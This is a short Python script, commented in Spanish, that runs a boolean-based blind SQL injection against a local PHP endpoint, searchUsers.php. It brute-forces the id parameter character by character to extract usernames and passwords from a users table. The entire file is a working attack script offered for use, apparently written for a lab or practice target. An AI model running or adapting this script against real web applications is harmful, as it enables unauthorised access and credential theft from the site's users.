#!/usr/bin/python3

import requests
import signal
import sys
import time
from pwn import *

# Variables Globales
main_url = "http://localhost/searchUsers.php"

def makeSQLI(): 

    p1 = log.progress("Fuerza Bruta")
    p1.status("Iniciando Proceso de Fuerza Bruta")

    time.sleep(2)

    p2 = log.progress("Datos Extraídos")

    extracted_info = ""

    for position in range (1, 150):
        for character in range(33, 126):
            
            sqli_url = main_url + "?id=9 or (select(select ascii(substring((select group_concat(username,0x3a,password) from users),%d,1)) from users where id = 1)=%d)" % (position, character)
                        
            p1.status(sqli_url)

            r = requests.get(sqli_url)

            if r.status_code == 200:
                extracted_info += chr(character)
                p2.status(extracted_info)
                break

def def_handler(sig,frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

# Ctrl+C 
signal.signal(signal.SIGINT, def_handler)


if __name__ == '__main__':

    makeSQLI()
